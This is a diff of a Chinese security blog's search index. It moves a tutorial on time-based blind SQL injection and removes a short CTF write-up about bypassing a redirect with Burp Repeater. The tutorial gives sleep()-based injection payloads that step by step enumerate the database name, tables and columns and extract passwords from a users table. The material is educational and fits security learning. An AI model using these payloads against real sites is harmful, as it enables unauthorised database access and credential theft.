+</ol>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>攻防世界-file_include</title>
     <url>/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-file_include/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>感觉挺开心的。</p>
@@ -4902,26 +4927,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       <tags>
         <tag>CTF</tag>
         <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>攻防世界-baby_web</title>
-    <url>/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-baby_web/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>也是一道非常简单的题目</p>
-<span id="more"></span>
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>看题<br>非常简单，就是要我们访问初始界面:index.php。<br>但问题是初始界面无法访问，总是会被重定向为:1.php。</p>
-</li>
-<li><p>抓包解决<br>既然在网页中不能访问初始界面，那么我们直接抓包。<br>抓包后送到Repeater，然后将1.php改为index.php，再send<br>之后即可在response中拿到flag</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -5274,6 +5279,48 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
+    <title>时间盲注</title>
+    <url>/2022/11/09/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>通过时间函数使SQL语句执行时间延长，从页面响应时间判断条件是否正确的一种注入方式。建议有不明白的地方可以先看看<a href="https://truthnian.github.io/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">布尔盲注</a>。</p>
+<span id="more"></span>
+
+<h1 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h1><p>当页面不返回查询信息的数据，只知道返回信息的对错（true or false）时，甚至没有对错返回时，即可用此方式。</p>
+<h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><h2 id="sleep-second-函数"><a href="#sleep-second-函数" class="headerlink" title="sleep(second)函数"></a>sleep(second)函数</h2><p>延迟函数<br>作用：延迟second的时间<br>示例:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if(length(database())&gt;5,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="benchmark-count-expr-函数"><a href="#benchmark-count-expr-函数" class="headerlink" title="benchmark(count,expr)函数"></a>benchmark(count,expr)函数</h2><p>作用：可测试某些特定操作的执行速度<br>count：执行次数<br>expr：表达式,表示重复计算表达式count次，评估执行表达式的效率<br>expr表达式必须返回单个值，不允许返回多行记录或多列值，因此只能查询一个字段，且返回值只有1个，才适用于这个函数。<br>示例：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> benchmark(<span class="number">100</span>,(<span class="keyword">select</span> username <span class="keyword">from</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">2</span>))</span><br></pre></td></tr></table></figure>
+
+<h1 id="过程步骤"><a href="#过程步骤" class="headerlink" title="过程步骤"></a>过程步骤</h1><ol>
+<li><p>判断数据库名长度</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if(length(database())&gt;5,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>猜解数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr(database(),1,1)))&gt;120,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>判断数据库表名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;120,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>判断数据库字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))))&gt;100,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>取数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and  if((ascii(substr(( select password from users limit 0,1),1,1)))&gt;1,1,sleep(10))--+  </span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>说明：建议写脚本，脚本有机会以后添加</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
+<li><a href="https://blog.csdn.net/qq_43431158/article/details/97496092">sql注入学习——时间盲注</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>时间盲注</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>文件包含漏洞</title>
     <url>/2022/12/07/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文件包含漏洞和文件上传漏洞还是有些相像的，但是文件包含难度要更大一些。</p>
@@ -5444,48 +5491,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </categories>
       <tags>
         <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>时间盲注</title>
-    <url>/2022/11/09/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>通过时间函数使SQL语句执行时间延长，从页面响应时间判断条件是否正确的一种注入方式。建议有不明白的地方可以先看看<a href="https://truthnian.github.io/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">布尔盲注</a>。</p>
-<span id="more"></span>
-
-<h1 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h1><p>当页面不返回查询信息的数据，只知道返回信息的对错（true or false）时，甚至没有对错返回时，即可用此方式。</p>
-<h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><h2 id="sleep-second-函数"><a href="#sleep-second-函数" class="headerlink" title="sleep(second)函数"></a>sleep(second)函数</h2><p>延迟函数<br>作用：延迟second的时间<br>示例:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if(length(database())&gt;5,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
-
-<h2 id="benchmark-count-expr-函数"><a href="#benchmark-count-expr-函数" class="headerlink" title="benchmark(count,expr)函数"></a>benchmark(count,expr)函数</h2><p>作用：可测试某些特定操作的执行速度<br>count：执行次数<br>expr：表达式,表示重复计算表达式count次，评估执行表达式的效率<br>expr表达式必须返回单个值，不允许返回多行记录或多列值，因此只能查询一个字段，且返回值只有1个，才适用于这个函数。<br>示例：</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> benchmark(<span class="number">100</span>,(<span class="keyword">select</span> username <span class="keyword">from</span> <span class="string">&#x27;user&#x27;</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">2</span>))</span><br></pre></td></tr></table></figure>
-
-<h1 id="过程步骤"><a href="#过程步骤" class="headerlink" title="过程步骤"></a>过程步骤</h1><ol>
-<li><p>判断数据库名长度</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if(length(database())&gt;5,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>猜解数据库名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr(database(),1,1)))&gt;120,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>判断数据库表名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;120,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>判断数据库字段名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and if((ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))))&gt;100,1,sleep(10))--+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>取数据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot; and  if((ascii(substr(( select password from users limit 0,1),1,1)))&gt;1,1,sleep(10))--+  </span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>说明：建议写脚本，脚本有机会以后添加</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
-<li><a href="https://blog.csdn.net/qq_43431158/article/details/97496092">sql注入学习——时间盲注</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>时间盲注</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
